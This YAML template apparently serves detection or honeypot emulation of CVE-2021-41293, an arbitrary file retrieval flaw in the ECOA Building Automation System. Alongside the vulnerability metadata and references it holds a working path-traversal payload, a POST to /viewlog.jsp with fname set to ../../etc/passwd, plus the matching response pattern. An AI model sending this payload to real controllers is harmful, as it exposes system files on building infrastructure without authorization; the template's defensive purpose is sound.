id: CVE-2021-41293
info:
  name: ECOA Building Automation System - Arbitrary File Retrieval
  author: 0x_Akoko
  description: The ECOA BAS controller suffers from an arbitrary file disclosure vulnerability.
    Using the 'fname' POST parameter in viewlog.jsp, attackers can disclose arbitrary
    files on the affected device and disclose sensitive and system information.
  severity: high
  remediation: 'Apply the latest security patches or updates provided by the vendor
    to fix the arbitrary file retrieval vulnerability in the ECOA Building Automation
    System.

    '
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2021-41293
  - https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5679.php
  - https://www.twcert.org.tw/tw/cp-132-5129-7e623-1.html
  - https://github.com/ARPSyndicate/cvemon
  - https://github.com/ARPSyndicate/kenzer-templates
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cve-id: CVE-2021-41293
    cwe-id: CWE-22
    epss-score: 0.05376
    epss-percentile: 0.92942
    cpe: cpe:2.3:o:ecoa:ecs_router_controller-ecs_firmware:-:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: ecoa
    product: ecs_router_controller-ecs_firmware
  tags: cve2021,cve,ecoa,lfi,disclosure
traps:
- request:
    method: POST
    path: /viewlog.jsp
    headers: {}
    body: 'yr=2021&mh=6&fname=../../../../../../../../etc/passwd

      '
  response:
    status_code: 200
    headers: {}
    body: 'root:.*:0:0:'
